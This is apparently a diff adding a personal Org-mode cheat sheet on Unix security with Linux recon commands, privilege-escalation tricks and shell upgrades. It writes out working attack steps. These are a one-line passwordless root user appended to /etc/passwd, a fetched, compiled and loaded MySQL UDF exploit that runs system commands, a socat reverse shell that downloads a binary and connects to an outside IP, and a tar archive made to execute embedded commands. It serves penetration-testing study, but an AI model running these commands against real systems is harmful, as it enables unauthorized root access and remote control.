@@ -1,0 +1,161 @@
+#+TITLE: Unix security
+#+INCLUDE: ../../../templates/rtfsg.org
+
+* Enumeration
+:PROPERTIES:
+:CUSTOM_ID: enum
+:END:
+
+Some tools and automated scripts:
+
+- [[https://github.com/rebootuser/LinEnum][LinEnum]]
+
+  Here are a few common recon commands:
+
+  #+begin_src shell
+# Env
+$ uname -a
+$ cat /etc/*-release 2>/dev/null
+$ env
+
+# Active processes
+$ ps aux | grep root
+$ ps aux | grep $(whoami)
+
+# What is readable / writeable / suid
+$ find / -perm -g=s -o -perm -u=s ! -type l -exec ls -lisad {} \; 2>/dev/null | sort -k 5,5
+$ find / -writable -type d ! -type l -exec ls -lisad {} \; 2>/dev/null
+$ ls -lisaR /root /home 2>/dev/null
+
+# Capabilities
+$ getcap -r / 2>/dev/null | grep 'set[ug]id'
+
+# Other user accounts
+$ cat /etc/passwd | cut -d':' -f1
+$ ls -lisa /home
+
+# Network
+$ cat /etc/hosts /etc/resolv.conf
+$ ip a
+$ iptables -L
+$ arp -a
+$ netstat -tulpn 2>/dev/null | grep LISTEN
+$ ss -tulpn 2>/dev/null | grep LISTEN
+  #+end_src
+
+* Exploits
+
+- [[https://www.exploit-db.com/exploits/10][Samba < 2.2.8 (Linux/BSD) - Remote Code Execution]]
+
+* Privilege escalation
+:PROPERTIES:
+:CUSTOM_ID: priv-esc
+:END:
+*** Guides and references
+
+- [[https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation][Basic Linux Privilege Escalation]]: guide by g0tm1lk.
+- [[https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html][Guide for OSCP]]: by sushant747.
+
+*** General-purpose tools
+
+*** Adding user to /etc/passwd
+
+This adds a user with *root* privileges to the */etc/passwd* file:
+
+#+begin_src shell
+echo "skw::0:0:skw:/home/skw:/bin/bash" >> /etc/passwd
+#+end_src
+
+*** Fail2Ban
+***** Weak permissions
+
+If the current user has write permissions on the */etc/fail2ban/* configuration,
+privilege escalation can be achieved. One of the possible way is described [[https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7][here]],
+where the */etc/fail2ban/action.d/iptables-multiport.conf* file is edited to add
+a reverse shell payload.
+
+The gist of it is to write the commands that you will want to see executed in
+some /fail2ban/ rule files. When the service gets restarted, the new
+configuration is loaded.
+
+***** Whois manipulation
+
+*** MySQL
+***** User-Defined Functions (UDF)
+
+Privilege escalation can be achieve through UDFs (User-Defined Function)
+as described by [[https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf][r3d-buck3t]] and [[https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation][hacktricks]]. Simply compile the [[https://www.exploit-db.com/exploits/1518][exploit]] by
+[[https://0xdeadbeef.info/][Marco Ivaldi aka Raptor]] as an ELF shared library and use it to create a
+MySQL UDF.
+
+#+begin_src shell
+skw@localhost:/tmp$ curl -so udf_exp.c https://www.exploit-db.com/raw/1518
+skw@localhost:/tmp$ gcc -c udf_exp.c
+skw@localhost:/tmp$ gcc -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so udf_exp.o -lc
+
+skw@localhost:/tmp$ mysql -u root -p mysql
+MariaDB [mysql]> use mysql; create table foo(line blob); insert into foo values(load_file('/tmp/raptor_udf2.so')); select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so'; create function do_system returns integer soname 'raptor_udf2.so'; select do_system('id > /tmp/id; chmod 777 /tmp/id');
+#+end_src
+
+*** Kernel exploits
+
+- [[https://www.exploit-db.com/exploits/18411][Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) - 'Mempodipper'
+  Local Privilege Escalation (1)]]
+- Dirty Cow (> 2.6.22) [[https://github.com/FireFart/dirtycow][firefart]], [[https://github.com/dirtycow/dirtycow.github.io][pokemon]], [[https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs][more PoCs]]
+
+* Misc
+:PROPERTIES:
+:CUSTOM_ID: misc
+:END:
+*** Upgrade simple shells to interactive ttys
+:PROPERTIES:
+:CUSTOM_ID: upgrade-shell
+:END:
+
+Credit goes to:
+
+- [[https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/][ROPNOP's blog]]
+
+***** Python
+
+#+BEGIN_SRC shell
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+#+END_SRC
+
+***** Socat
+
+#+BEGIN_SRC shell
+# On client
+$ socat file:`tty`,raw,echo=0 tcp-listen:1234
+# On server
+$ curl -o /tmp/socat -OL https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
+$ chmod +x /tmp/socat
+$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.11.12.13:1234
+#+END_SRC
+
+*** Executable tar file
+:PROPERTIES:
+:CUSTOM_ID: exec-tar
+:END:
+
+Embed and run shell commands in a tar archive:
+
+#+BEGIN_SRC shell
+$ mkdircd test
+$ touch $'\nid;'
+$ touch $'\nls -lisa;'
+$ tar cf payload.tar *
+$ file payload.tar
+payload.tar: POSIX tar archive (GNU)
+$ chmod +x payload.tar
+$ ./payload.tar
+uid=1000(skywhi) gid=1000(skywhi) groups=1000(skywhi)
+./payload.tar: line 2: 0000644000175000017500000000000013715316137011115: command not found
+total 12
+641879  0 drwxr-xr-x 2 skywhi skywhi   100 Aug 13 22:03  .
+552758  0 drwxr-xr-x 3 skywhi skywhi    60 Aug 13 22:00  ..
+640946  0 -rw-r--r-- 1 skywhi skywhi     0 Aug 13 22:02 ''$'\n''id;'
+641004  0 -rw-r--r-- 1 skywhi skywhi     0 Aug 13 22:03 ''$'\n''ls -lisa;'
+654585 12 -rwxr-xr-x 1 skywhi skywhi 10240 Aug 13 22:03  payload.tar
+./payload.tar: line 3: 0000644000175000017500000000000013715316202012116: command not found
+#+END_SRC
